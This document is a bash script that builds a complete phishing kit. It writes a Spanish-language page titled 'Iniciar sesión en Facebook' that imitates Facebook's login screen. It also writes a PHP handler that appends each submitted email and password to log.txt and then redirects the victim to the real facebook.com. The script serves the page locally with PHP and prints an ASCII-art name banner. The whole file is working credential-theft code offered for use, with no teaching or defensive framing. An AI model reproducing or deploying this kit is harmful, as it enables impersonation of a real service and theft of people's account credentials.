#!/bin/bash

# Crear el archivo HTML
cat > index.html <<EOL
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Facebook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 360px;
            text-align: center;
        }

        .login-form h2 {
            color: #1877f2;
            margin-bottom: 20px;
        }

        .login-form input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-form button {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-form button:hover {
            background-color: #166fe5;
        }

        .login-form a {
            display: block;
            margin: 10px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .login-form hr {
            border: 1px solid #dddfe2;
            margin: 20px 0;
        }

        .create-account {
            background-color: #42b72a;
            padding: 12px;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        .create-account:hover {
            background-color: #36a420;
        }

        .login-container .icon {
            margin-bottom: 20px;
        }

        .icon-facebook {
            color: #1877f2;
            font-size: 50px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="icon">
            <i class="fab fa-facebook icon-facebook"></i>
        </div>
        <div class="login-form">
            <h2>Iniciar sesión en Facebook</h2>
            <form action="login.php" method="post">
                <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required pattern="([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6})|(\+?\d{1,4}[\d\s-]{3,})" title="Por favor ingrese un correo electrónico válido o un número de teléfono">
                <input type="password" name="password" placeholder="Contraseña" required>
                <button type="submit">Iniciar sesión</button>
            </form>
            <a href="#">¿Olvidaste tu contraseña?</a>
            <hr>
            <button class="create-account">Crear cuenta nueva</button>
        </div>
    </div>
</body>
</html>
EOL

# Crear el archivo PHP
cat > login.php <<EOL
<?php
if (\$_SERVER["REQUEST_METHOD"] == "POST") {
    \$email = \$_POST['email'];
    \$password = \$_POST['password'];
    \$data = "Email: \$email, Password: \$password\\n";
    file_put_contents('log.txt', \$data, FILE_APPEND);
    header('Location: https://www.facebook.com');
    exit();
}
?>
EOL

# Crear el servidor local en el puerto 8080
php -S localhost:8080

# Mostrar el dibujo ASCII en colores
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

cat << "EOF"
${RED}  __                                
 /\ \                 __            
 \ \ \       __  __  /\_\     ____  
  \ \ \  __ /\ \/\ \ \/\ \   /',__\ 
   \ \ \L\ \\ \ \_\ \ \ \ \ /\__, `\
    \ \____/ \ \____/  \ \_\\/\____/
     \/___/   \/___/    \/_/ \/___/ 
                                    
                                    
${BLUE}  ____                          
 /\  _`\                        
 \ \,\L\_\      __       ___    
  \/_\__ \    /'__`\   /' _ `\  
    /\ \L\ \ /\ \L\.\_ /\ \/\ \ 
    \ `\____\\ \__/.\_\\ \_\ \_\
     \/_____/ \/__/\/_/ \/_/\/_/
                                
                                
  ${RED}_____                                
 /\___ \                               
 \/__/\ \   __  __     __       ___    
    _\ \ \ /\ \/\ \  /'__`\   /' _ `\  
   /\ \_\ \\ \ \_\ \/\ \L\.\_ /\ \/\ \ 
   \ \____/ \ \____/\ \__/.\_\\ \_\ \_\
    \/___/   \/___/  \/__/\/_/ \/_/\/_/
${NC}
EOF